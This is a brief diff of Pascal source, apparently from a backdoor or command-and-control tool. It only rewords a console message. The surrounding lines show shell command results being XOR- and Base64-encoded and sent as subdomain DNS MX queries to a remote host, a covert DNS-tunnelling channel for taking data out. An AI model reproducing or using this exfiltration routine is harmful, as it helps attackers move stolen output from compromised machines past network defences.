@@ -214,7 +214,7 @@ begin
 
   DNSd.TargetHost := i_host;
   DNSd.DNSQuery(TestXorBase64(Arr[i])+'.'+i_host, QType_MX, l);
-  writeln('[+]Shell command results has been sent -> ');
+  writeln('[+]Shell command results are encrypted and sent successfully -> ');
 end;
 
    //it is not urgent to free dns component or stringlist in our code case
